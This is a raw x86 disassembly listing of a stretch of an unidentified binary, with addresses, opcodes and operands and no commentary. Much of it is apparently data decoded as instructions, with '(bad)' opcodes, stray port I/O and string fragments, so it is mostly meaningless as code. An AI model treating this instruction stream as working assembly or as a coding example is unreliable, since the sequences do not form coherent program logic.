  42256b:	push   esp
  42256c:	outs   dx,DWORD PTR ds:[esi]
  42256d:	inc    ebx
  42256e:	jne    0x4225e2
  422570:	jae    0x4225e1
  422572:	jb     0x422574
  422574:	fs and eax,0x42
  42257a:	add    BYTE PTR [eax],al
  42257c:	add    BYTE PTR [eax],al
  42257e:	add    BYTE PTR [eax],al
  422580:	and    BYTE PTR [ecx],ch
  422582:	inc    edx
  422583:	add    BYTE PTR [eax],ch
  422585:	sub    DWORD PTR [edx+0x0],eax
  422588:	loopne 0x4225b1
  42258a:	inc    edx
  42258b:	add    dl,dh
  42258d:	inc    edx
  42258e:	push   ebx
  42258f:	lea    edx,ds:0x1a59ba5
  422595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422596:	popf   
  422597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422598:	jno    0x42253f
  42259a:	xchg   edi,eax
  42259b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259c:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225a2:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  4225a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225aa:	mov    ebx,0xd183d3a5
  4225af:	lea    edx,[ebp-0x645aea5b]
  4225b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b6:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  4225bc:	xchg   edi,eax
  4225bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225be:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225c4:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  4225cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225cc:	mov    ebx,0xd1e3d3a5
  4225d1:	in     eax,dx
  4225d2:	xchg   ebp,eax
  4225d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d4:	adc    eax,0x3ba59ba5
  4225d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225da:	popf   
  4225db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225dc:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  4225e2:	(bad)  
  4225e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e4:	fwait
  4225e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e6:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  4225ec:	icebp  
  4225ed:	sub    eax,0xf172ff7
  4225f2:	adc    eax,0x3a59109
  4225f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f8:	fwait
  4225f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fa:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422600:	xchg   ebp,eax
  422601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422602:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  422608:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  42260f:	or     eax,0x6f170ff7
  422614:	adc    eax,0x3a59169
  422619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261a:	fwait
  42261b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261c:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422622:	xchg   ebp,eax
  422623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422624:	xor    eax,0x9ba58da5
  422629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262a:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
  422631:	ins    DWORD PTR es:[edi],dx
  422632:	imul   DWORD PTR [edi+0x17]
  422635:	dec    edi
  422636:	adc    eax,0x37a59149
  42263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263c:	fwait
  42263d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263e:	jae    0x4225e5
  422640:	popf   
  422641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422642:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  422648:	(bad)  
  422649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264a:	fwait
  42264b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264c:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  422653:	dec    ebp
  422654:	test   DWORD PTR [edi+0x16],0x91a914af
  42265b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265c:	aaa    
  42265d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265e:	fwait
  42265f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422660:	jae    0x422607
  422662:	popf   
  422663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422664:	pop    ss
  422665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422666:	xchg   ebp,eax
  422667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422668:	push   ecx
  422669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422670:	rol    DWORD PTR [ebx-0x2f],cl
  422673:	dec    ebp
  422674:	lock lods eax,DWORD PTR ds:[esi]
  422676:	imul   BYTE PTR [edi-0x76eb70ea]
  42267c:	xchg   ecx,eax
  42267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267e:	aaa    
  42267f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422680:	fwait
  422681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422682:	jae    0x422629
  422684:	popf   
  422685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422686:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  42268c:	(bad)  
  42268d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268e:	fwait
  42268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422690:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  422696:	lock (bad) 
  422698:	test   BYTE PTR [edi-0x16eb10ea],0x91
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	aaa    
  4226a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a2:	fwait
  4226a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a4:	jae    0x42264b
  4226a6:	popf   
  4226a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a8:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  4226ae:	(bad)  
  4226af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b0:	fwait
  4226b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b2:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  4226b9:	in     eax,dx
  4226ba:	imul   bh
  4226bc:	push   ss
  4226bd:	iret   
  4226be:	adc    al,0xc9
  4226c0:	xchg   ecx,eax
  4226c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c2:	cmp    eax,0x51a59ba5
  4226c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c8:	popf   
  4226c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ca:	jnp    0x422671
  4226cc:	xchg   ebx,eax
  4226cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ce:	fwait
  4226cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d0:	xchg   ecx,eax
  4226d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d2:	shl    bl,cl
  4226d4:	shr    ch,1
  4226d6:	lock int 0xf6
  4226d9:	iret   
  4226da:	push   ss
  4226db:	das    
  4226dc:	adc    al,0x29
  4226de:	push   ss
  4226df:	unpcklps xmm1,XMMWORD PTR [ecx]
  4226e2:	xchg   ebx,eax
  4226e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e4:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  4226ea:	lahf   
  4226eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ec:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  4226f2:	mov    DWORD PTR [ebp-0x5a725a65],esp
  4226f8:	shl    BYTE PTR [ebx],cl
  4226fa:	shr    BYTE PTR ds:0xff60df0,1
  422700:	push   ss
  422701:	outs   dx,DWORD PTR ds:[esi]
  422702:	adc    al,0x69
  422704:	xchg   ecx,eax
  422705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422706:	add    BYTE PTR [eax],al
  422708:	nop
  422709:	and    eax,0x279c0042
  42270e:	inc    edx
  42270f:	add    BYTE PTR [edi+eiz*1+0x292c0042],ah
  422716:	inc    edx
  422717:	add    BYTE PTR [eax-0x57ffbddb],cl
  42271d:	daa    
  42271e:	inc    edx
  42271f:	add    dh,cl
  422721:	jle    0x422765
  422723:	add    BYTE PTR [esi-0x7f],al
  422726:	inc    edx
  422727:	add    BYTE PTR [eax+0x1c004228],bl
  42272d:	sub    DWORD PTR [edx+0x0],eax
  422730:	test   BYTE PTR [edi],ah
  422732:	inc    edx
  422733:	add    BYTE PTR [eax+0x18004227],cl
  422739:	sub    DWORD PTR [edx+0x0],eax
  42273c:	in     al,dx
  42273d:	daa    
  42273e:	inc    edx
  42273f:	add    BYTE PTR [edx-0x36],cl
  422742:	push   es
  422743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422744:	scas   al,BYTE PTR es:[edi]
  422745:	or     eax,0x27a0a506
  42274a:	inc    edx
  42274b:	add    BYTE PTR [eax+0x28],dl
  42274e:	inc    edx
  42274f:	add    BYTE PTR [eax+ebp*1+0x42],ah
  422753:	add    BYTE PTR [eax+0x28],dh
  422756:	inc    edx
  422757:	add    BYTE PTR [eax-0x27ffbdd8],al
  42275d:	daa    
  42275e:	inc    edx
  42275f:	add    BYTE PTR [ebp+eiz*1+0x27f80042],cl
  422766:	inc    edx
  422767:	add    al,ch
  422769:	daa    
  42276a:	inc    edx
  42276b:	add    BYTE PTR [eax],dh
  42276d:	sub    DWORD PTR [edx+0x0],eax
  422770:	scas   al,BYTE PTR es:[edi]
  422771:	fwait
  422772:	push   es
  422773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422774:	cmp    BYTE PTR [edx-0x19],al
  422777:	mov    esp,0x422808
  42277c:	adc    BYTE PTR [eax],ch
  42277e:	inc    edx
  42277f:	add    BYTE PTR [edi+eiz*1-0x79dbffbe],ch
  422786:	loopne 0x422744
  422788:	jbe    0x422804
  42278a:	pop    ds
  42278b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42278c:	add    BYTE PTR [eax],al
  42278e:	inc    eax
  42278f:	add    cl,dh
  422791:	retf   
  422792:	arpl   WORD PTR [eax+0x43],bx
  422795:	add    DWORD PTR [edx+0x0],0x6ae878a8
  42279c:	ja     0x4227ac
  42279e:	pop    ebx
  42279f:	xor    BYTE PTR [esi-0x6],dh
  4227a2:	(bad)  
  4227a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a4:	mov    dl,0xd
  4227a6:	xchg   ebx,eax
  4227a7:	test   eax,0x422794
  4227ac:	stos   BYTE PTR es:[edi],al
  4227ad:	fild   DWORD PTR [esi]
  4227af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b0:	stos   BYTE PTR es:[edi],al
  4227b1:	fild   WORD PTR [esi]
  4227b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b5:	fild   DWORD PTR [esi]
  4227b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b8:	mov    ds:0xbea506db,al
  4227bd:	fild   DWORD PTR [esi]
  4227bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c0:	mov    edx,0xb6a506db
  4227c5:	fild   DWORD PTR [esi]
  4227c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c8:	mov    dl,0xdb
  4227ca:	push   es
  4227cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227cc:	mov    ds,ebx
  4227ce:	push   es
  4227cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d0:	mov    bl,bl
  4227d2:	push   es
  4227d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d4:	out    dx,al
  4227d5:	fild   DWORD PTR [esi]
  4227d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d8:	dec    DWORD PTR [edx]
  4227da:	adc    edi,DWORD PTR [ebx]
  4227dc:	test   BYTE PTR ds:0x2a750042,ah
  4227e2:	inc    edx
  4227e3:	add    BYTE PTR [ecx+0x73],ah
  4227e6:	push   0x69bae79
  4227eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ec:	cmp    cl,dl
  4227ee:	xlat   BYTE PTR ds:[ebx]
  4227ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f0:	dec    sp
  4227f2:	add    BYTE PTR [eax],al
  4227f4:	and    BYTE PTR ds:0x42220042,0x1b
  4227fb:	add    DWORD PTR [eax],0x0
	...
  422806:	add    BYTE PTR [eax],al
  422808:	hlt    
  422809:	stc    
  42280a:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  422811:	inc    esi
  422812:	pop    ds
  422813:	jg     0x422815
	...
  422839:	add    BYTE PTR [eax],al
  42283b:	add    dh,cl
  42283d:	jle    0x422881
	...
  42284b:	add    BYTE PTR [edi-0x4c],al
  42284e:	inc    ecx
  42284f:	add    BYTE PTR [ebp-0x5b],cl
  422852:	push   ecx
  422853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422854:	jg     0x4227fb
  422856:	inc    edi
  422857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422858:	push   ecx
  422859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285a:	inc    ebx
  42285b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285c:	std    
  42285d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285e:	jmp    DWORD PTR [ebp+0xa59b]
  422864:	push   ebp
  422865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422866:	push   ebx
  422867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422868:	dec    ecx
  422869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286a:	std    
  42286b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422872:	jge    0x422819
  422874:	push   ecx
  422875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422876:	jg     0x42281d
  422878:	std    
  422879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287a:	jmp    DWORD PTR [ebp+0xa59b]
  422880:	jge    0x422827
  422882:	dec    ebx
  422883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422884:	inc    ebx
  422885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422886:	jne    0x42282d
  422888:	pop    ecx
  422889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288a:	jnp    0x422831
  42288c:	dec    ecx
  42288d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288e:	fwait
  42288f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  422898:	xor    eax,ecx
  42289a:	xor    esp,DWORD PTR [ecx]
  42289c:	xor    eax,DWORD PTR [ecx]
  42289e:	xor    esp,DWORD PTR [ecx+0x33]
  4228a1:	inc    ecx
  4228a2:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  4228a8:	xor    al,cl
  4228aa:	xor    ah,BYTE PTR [ecx]
  4228ac:	xor    al,BYTE PTR [ecx]
  4228ae:	xor    ah,BYTE PTR [ecx+0x32]
  4228b1:	inc    ecx
  4228b2:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  4228b8:	xor    ecx,ebp
  4228ba:	xor    ecx,edi
  4228bc:	xor    ecx,ecx
  4228be:	xor    ecx,ebx
  4228c0:	xor    edx,ebp
  4228c2:	xor    edx,edi
  4228c4:	xor    edx,ecx
  4228c6:	xor    edx,ebx
  4228c8:	xor    ebx,ebp
  4228ca:	xor    ebx,edi
  4228cc:	xor    ebx,ecx
  4228ce:	xor    ebx,ebx
  4228d0:	xor    eax,edi
  4228d2:	push   ebx
  4228d3:	shl    DWORD PTR [ebx-0x3f],0x93
  4228d7:	rcl    BYTE PTR [esi-0x55],0x15
  4228db:	iret   
  4228dc:	xchg   ebp,eax
  4228dd:	dec    eax
  4228de:	xor    ecx,ebp
  4228e0:	sbb    eax,0x50aaaae3
  4228e5:	imul   ebx,DWORD PTR [esi],0x2f
  4228e8:	je     0x4228ff
  4228ea:	mov    DWORD PTR [edx+0x556ad694],ecx
  4228f0:	imul   edi,ebx,0xffffffd5
  4228f3:	enter  0x4927,0xef
  4228f7:	popf   
  4228f8:	mov    dh,0xde
  4228fa:	dec    esi
  4228fb:	xchg   esp,eax
  4228fc:	lock xor BYTE PTR [esi-0x6b],ch
  422900:	inc    ebp
  422901:	or     al,0x76
  422903:	or     DWORD PTR [edi-0x40],eax
  422906:	js     0x4228c2
  422908:	popa   
  422909:	pop    eax
  42290a:	jecxz  0x422976
  42290c:	mov    BYTE PTR [ebx-0x56],0x4
  422910:	cs leave 
  422912:	inc    esi
  422913:	stos   DWORD PTR es:[edi],eax
  422914:	inc    esp
  422915:	ds inc ebp
  422917:	enter  0x82f6,0x93
  42291b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42291c:	sbb    DWORD PTR [eax],ecx
  42291e:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  422922:	inc    edx
  422923:	add    cl,dl
  422925:	ja     0x422996
  422927:	mov    WORD PTR gs:[edi],fs
  42292a:	inc    edx
  42292b:	add    al,dh
  42292d:	daa    
  42292e:	inc    edx
  42292f:	add    BYTE PTR [esi-0x6],dh
  422932:	fbld   TBYTE PTR [eax+eax*1+0x0]
  422939:	add    BYTE PTR [eax],al
  42293b:	add    BYTE PTR [eax],al
  42293d:	add    BYTE PTR [eax],al
  42293f:	add    BYTE PTR [eax-0x15],bl
  422942:	push   ss
  422943:	cmp    eax,0x65646543
  422948:	push   esi
  422949:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  422951:	jb     0x4229c7
  422953:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  422958:	jecxz  0x422921
  42295a:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  42295f:	cmp    al,BYTE PTR [esi-0x2d]
  422962:	jno    0x4229de
  422964:	outs   dx,DWORD PTR ds:[esi]
  422965:	jae    0x4229d7
  422967:	popa   
  422968:	je     0x4229d2
  42296a:	bound  esp,QWORD PTR [ecx+0x73]
  42296d:	je     0x4229de
  42296f:	outs   dx,DWORD PTR ds:[esi]
  422970:	test   eax,0xde3655f5
  422975:	in     al,0x6c
  422977:	jne    0x4229e1
  422979:	bound  esp,QWORD PTR [ebp+0x4b]
  42297c:	popa   
  42297d:	jbe    0x4229e0
  42297f:	outs   dx,WORD PTR ds:[esi]
  422981:	jns    0x4229f2
  422983:	imul   edi,DWORD PTR [eax],0x2c054cf4
  422989:	pusha  
  42298a:	and    BYTE PTR [edi+0x79],dh
  42298d:	gs jo  0x4229ff
  422990:	ins    DWORD PTR es:[edi],dx
  422991:	ja     0x422a0c
  422993:	gs inc ebp
  422995:	jns    0x4229fc
  422997:	jb     0x422999
	...
  4229a9:	add    BYTE PTR [eax],al
  4229ab:	add    BYTE PTR [esi-0x4e],dl
  4229ae:	and    dl,BYTE PTR [ecx]
  4229b0:	imul   esp,DWORD PTR [ebx+0x75],0x74
  4229b4:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  4229bc:	fldcw  WORD PTR [eax+edx*2]
  4229bf:	fimul  WORD PTR [ebx]
  4229c1:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  4229c5:	fldcw  WORD PTR [eax+0x69]
  4229c8:	lods   al,BYTE PTR ds:[esi]
  4229c9:	repnz retf 0xe41c
  4229cd:	inc    ebx
  4229ce:	outs   dx,DWORD PTR ds:[esi]
  4229cf:	je     0x422a44
  4229d1:	dec    esp
  4229d2:	popa   
  4229d3:	jp     0x422a4e
  4229d5:	push   ebx
  4229d6:	imul   esp,DWORD PTR [ecx+0x73],0x73
  4229da:	push   0xc3066a00
  4229df:	lds    eax,FWORD PTR [eax+0x6569646f]
  4229e5:	add    al,bl
  4229e7:	mov    ebp,0x2ee9d1e4
  4229ec:	jle    0x4229a0
  4229ee:	data16 gs ja 0x422a65
  4229f2:	jne    0x422a56
  4229f4:	add    BYTE PTR [eax],al
  4229f6:	add    DWORD PTR [edx+0x51cf72f8],edi
  4229fc:	fstp   DWORD PTR [eax+0x74]
  4229ff:	popa   
  422a00:	jae    0x422a74
  422a02:	popa   
  422a03:	js     0x422a6d
  422a05:	outs   dx,DWORD PTR ds:[esi]
  422a06:	add    BYTE PTR [eax],al
  422a08:	mov    esi,0x4d270df8
  422a0d:	popa   
  422a0e:	ins    BYTE PTR es:[edi],dx
  422a0f:	je     0x422a5d
  422a11:	jne    0x422a85
  422a13:	imul   eax,DWORD PTR [eax],0x0
  422a16:	dec    edx
  422a17:	loope  0x422a27
  422a19:	out    0xd3,al
  422a1b:	test   al,0x57
  422a1d:	popa   
  422a1e:	jb     0x422a8b
  422a20:	jne    0x422a96
  422a22:	outs   dx,DWORD PTR fs:[esi]
  422a24:	bound  ebp,QWORD PTR [edi+0x0]
  422a27:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  422a2e:	jne    0x422a9d
  422a30:	outs   dx,DWORD PTR ds:[esi]
  422a31:	js     0x422a33
  422a33:	add    BYTE PTR [ecx+edx*8+0x58],ch
  422a37:	or     bh,BYTE PTR [ecx+ebx*2]
  422a3a:	add    al,0xd6
  422a3c:	gs ins DWORD PTR es:[edi],dx
  422a3e:	jns    0x422aaf
  422a40:	jo     0x422ab7
  422a42:	je     0x422a97
  422a44:	push   0x6170676f
  422a49:	jns    0x422ab5
  422a4b:	outs   dx,DWORD PTR ds:[esi]
  422a4c:	popa   
  422a4d:	jns    0x422a09
  422a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a50:	scas   al,BYTE PTR es:[edi]
  422a51:	or     al,0xaf
  422a53:	adc    al,0x63
  422a55:	popa   
  422a56:	jns    0x422a9f
  422a58:	jne    0x422ad0
  422a5a:	jae    0x422ad0
  422a5c:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a63:	jb     0x422aca
  422a65:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a69:	(bad)  
  422a6a:	out    dx,al
  422a6b:	push   ebx
  422a6c:	popa   
  422a6d:	arpl   WORD PTR [ebx+0x66],si
  422a70:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a77:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a7d:	push   eax
  422a7e:	ja     0x422a0a
  422a80:	cdq    
  422a81:	adc    bh,0x8a
  422a84:	pop    esi
  422a85:	fldenv [ecx+0x6f5038a6]
  422a8b:	adc    bh,0x8b
  422a8e:	arpl   WORD PTR [edx],si
  422a90:	test   eax,0x92fcefd7
  422a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a96:	xchg   ah,bh
  422a98:	fsubr  st,st(7)
  422a9a:	arpl   sp,di
  422a9c:	fsub   DWORD PTR [esi+0xc92fc86]
  422aa2:	cdq    
  422aa3:	jo     0x422b19
  422aa5:	xchg   edi,eax
  422aa6:	add    BYTE PTR [edi+0x77019696],0x8b
  422aad:	push   eax
  422aae:	ja     0x422a3a
  422ab0:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422ab7:	cmp    BYTE PTR [eax+0xc],dl
  422aba:	adc    BYTE PTR [edi-0x28089c75],0x9
  422ac1:	xor    BYTE PTR [edi-0x11],0xfc
  422ac5:	xchg   edx,eax
  422ac6:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422acc:	cld    
  422acd:	xchg   edx,eax
  422ace:	outs   dx,DWORD PTR ds:[esi]
  422acf:	mov    ds:0x31ec92fc,eax
  422ad4:	jo     0x422ad1
  422ad6:	out    dx,al
  422ad7:	lea    edx,[edi-0x69697880]
  422add:	add    DWORD PTR [edi-0x75],esi
  422ae0:	push   eax
  422ae1:	ja     0x422a6d
  422ae3:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422aea:	hlt    
  422aeb:	push   eax
  422aec:	or     al,0x80
  422aee:	xchg   edi,eax
  422aef:	mov    esp,DWORD PTR [ebx-0x9]
  422af2:	xlat   BYTE PTR ds:[ebx]
  422af3:	out    dx,al
  422af4:	cld    
  422af5:	xchg   edx,eax
  422af6:	mov    WORD PTR [ebx],ss
  422af8:	xor    BYTE PTR [edi-0x11],0xfc
  422afc:	xchg   edx,eax
  422afd:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422b03:	jo     0x422b00
  422b05:	out    dx,al
  422b06:	lea    edx,[edi-0x69697880]
  422b0c:	add    DWORD PTR [edi-0x75],esi
  422b0f:	push   eax
  422b10:	ja     0x422a9c
  422b12:	cdq    
  422b13:	adc    bh,0x8a
  422b16:	pop    esi
  422b17:	fsubrp st(7),st
  422b19:	xor    edi,DWORD PTR [eax+edx*2]
  422b1c:	outs   dx,DWORD PTR ds:[esi]
  422b1d:	adc    bh,0x8b
  422b20:	arpl   WORD PTR [edx],si
  422b22:	test   eax,0xd8fca6d7
  422b27:	out    dx,al
  422b28:	fwait
  422b29:	mov    ecx,0x31ec927c
  422b2e:	fwait
  422b2f:	cld    
  422b30:	or     al,0x43
  422b32:	jo     0x422ba8
  422b34:	xchg   edi,eax
  422b35:	add    BYTE PTR [edi+0x77019696],0x8b
  422b3c:	push   eax
  422b3d:	ja     0x422ac9
  422b3f:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422b46:	cmp    BYTE PTR [eax+0xc],dl
  422b49:	adc    BYTE PTR [edi-0x28089c75],0xff
  422b50:	xor    BYTE PTR [edi-0x11],0xfc
  422b54:	xchg   edx,eax
  422b55:	out    dx,eax
  422b56:	mov    ds:0x963a6dfc,eax
  422b5b:	cld    
  422b5c:	xchg   edx,eax
  422b5d:	das    
  422b5e:	stos   DWORD PTR es:[edi],eax
  422b5f:	jo     0x422b5c
  422b61:	out    dx,al
  422b62:	lea    ebx,[ebx-0x7f686c67]
  422b68:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b6e:	cmp    eax,0xd7808a0a
  422b73:	sbb    eax,0x9925d73a
  422b78:	adc    bh,0x15
  422b7b:	dec    eax
  422b7c:	shr    DWORD PTR [edx-0x12f24e71],1
  422b82:	std    
  422b83:	dec    ebp
  422b84:	xchg   esp,eax
  422b85:	test   BYTE PTR [ebx-0x9],cl
  422b88:	or     cl,BYTE PTR [edi+0x4dfded51]
  422b8e:	xchg   esp,eax
  422b8f:	test   BYTE PTR [ebx-0x9],cl
  422b92:	or     cl,BYTE PTR [esi+edi*8]
  422b95:	or     BYTE PTR ds:0x432187ed,0x6a
  422b9c:	ins    DWORD PTR es:[edi],dx
  422b9d:	or     cl,BYTE PTR [edx]
  422b9f:	or     cl,BYTE PTR [edx]
  422ba1:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422ba7:	adc    DWORD PTR [ebp+0x5e],ecx
  422baa:	(bad)  
  422bab:	in     al,dx
  422bac:	lea    ecx,[ebp+0x10018494]
  422bb2:	pop    ecx
  422bb3:	mov    WORD PTR [ebp-0x1172a173],cs
  422bb9:	(bad)  
  422bba:	out    dx,al
  422bbb:	mov    dh,0xbe
  422bbd:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
  422bc2:	xchg   BYTE PTR [ecx+0xc],ah
  422bc5:	lea    ecx,[ebp+0x5901cbf8]
  422bcb:	add    DWORD PTR [ebx-0x80],ebp
  422bce:	out    0x8a,eax
  422bd0:	xor    BYTE PTR [edi+0x32],0x43
  422bd4:	out    0x35,eax
  422bd6:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422bda:	xchg   BYTE PTR [edx-0x73],ah
  422bdd:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422be3:	dec    edi
  422be4:	repnz lea ecx,[ebp-0x370f7073]
  422beb:	xor    esp,edi
  422bed:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422bf4:	mov    al,ds:0xec9d8894
  422bf9:	or     eax,0xeb6501a9
  422bfe:	mov    dl,0xbc
  422c00:	out    dx,eax
  422c01:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422c08:	mov    eax,ds:0x99968d8d
  422c0d:	cli    
  422c0e:	lea    edi,[edx]
  422c10:	lea    ecx,[ebp-0x1bc59df6]
  422c16:	push   ebp
  422c17:	and    bh,0x8a
  422c1a:	inc    ebx
  422c1b:	out    0x83,eax
  422c1d:	or     eax,esp
  422c1f:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422c26:	push   ecx
  422c27:	xor    ecx,DWORD PTR [ebx-0x14]
  422c2a:	push   ecx
  422c2b:	add    ebp,eax
